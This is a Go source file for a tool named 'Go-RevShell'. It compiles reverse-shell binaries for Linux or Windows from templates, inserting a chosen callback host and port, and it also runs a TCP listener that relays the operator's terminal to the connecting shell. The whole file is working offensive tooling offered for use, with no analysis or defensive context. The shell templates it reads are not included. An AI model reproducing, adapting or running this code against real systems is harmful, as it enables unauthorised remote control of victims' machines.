package main

import (
	"bytes"
	"flag"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
)

const banner string = `
  ____                   ____                   ____    _              _   _
 / ___|   ___           |  _ \    ___  __   __ / ___|  | |__     ___  | | | |
| |  _   / _ \   _____  | |_) |  / _ \ \ \ / / \___ \  | '_ \   / _ \ | | | |
| |_| | | (_) | |_____| |  _ <  |  __/  \ V /   ___) | | | | | |  __/ | | | |
 \____|  \___/          |_| \_\  \___|   \_/   |____/  |_| |_|  \___| |_| |_|

`

func main() {
	host, port, template, listenPort, buildExt := initArgs()
	println(banner)
	if listenPort != "0" {
		listenTcp(listenPort)
	} else {
		buildReverseShell(port, host, template, buildExt)
	}
}

func initArgs() (string, string, string, string, string) {
	host := flag.String("i", "localhost", "IP of the host which the reverse shell will connect to.")
	port := flag.String("p", "1111", "Port of the host which the reverse shell will connect to.")
	serverOs := flag.String("s", "linux", "OS of the server which will start the reverse shell (used to build the right binary) available : \"windows\", \"linux\".")
	template := flag.String("t", "native", "Template to use to generate the reverse shell. Available : \"native\", \"pty\".")
	listenPort := flag.String("l", "0", "Port to listen (you can use this argument to bind to your reverse shell).")
	flag.Parse()
	if flag.NFlag() == 0 {
		println("[+] No argument passed. Using default values.")
	}
	switch *template {
	case "pty":
		*template = "Go-PTY-RevShell.template"
	default:
		*template = "Go-RevShell.template"
	}
	return *host, *port, *template, *listenPort, *serverOs
}

func buildReverseShell(port, host, templateFileName, serverOs string) {
	println("[+] Compiling reverse shell for " + host + ":" + port + " ...")
	template, err := ioutil.ReadFile("templates/" + templateFileName)
	handleError("Reading template", err)
	template = bytes.ReplaceAll(template, []byte("template-host"), []byte(host))
	template = bytes.ReplaceAll(template, []byte("template-port"), []byte(port))
	tmpFileName, finalFileName, fileExt := "tmp.go", "Go-RevShell", ""
	handleError("Writing template to temp file", ioutil.WriteFile(tmpFileName, template, 0600))
	if serverOs == "windows" {
		fileExt = ".exe"
	}
	handleError("Preaparing compilation", os.Setenv("GOOS", serverOs))
	handleError("Compiling", exec.Command("go", "build", "-o", finalFileName+fileExt, tmpFileName).Run())
	handleError("Removing temp file", os.Remove(tmpFileName))
	println("[+] Build is done ! The file to execute server side is \"" + finalFileName + fileExt + "\".")
}

func listenTcp(port string) {
	listener, err := net.Listen("tcp", ":"+port)
	handleError("Listening tcp", err)
	defer listener.Close()
	connexion, err := listener.Accept()
	handleError("Accepting connection", err)
	chan_stdout := synchronizeClientServer(connexion, os.Stdout)
	chan_stdin := synchronizeClientServer(os.Stdin, connexion)
	select {
	case <-chan_stdout:
		println("[-] Remote connection is closed.")
	case <-chan_stdin:
		println("[-] Local connection is closed.") // Should not happen as connexion is at the server initiative, so closing is too
	}
}

func synchronizeClientServer(source io.Reader, destination io.Writer) <-chan int {
	buffer := make([]byte, 1024)
	sync_channel := make(chan int)
	go func() {
		for {
			nBytes, err := source.Read(buffer)
			if err != nil {
				break
			}
			_, err = destination.Write(buffer[0:nBytes])
			handleError("Write to remote", err)
		}
		sync_channel <- 0
	}()
	return sync_channel
}

func handleError(reason string, err error) {
	if err != nil {
		log.Println(reason + " : " + err.Error())
	}
}
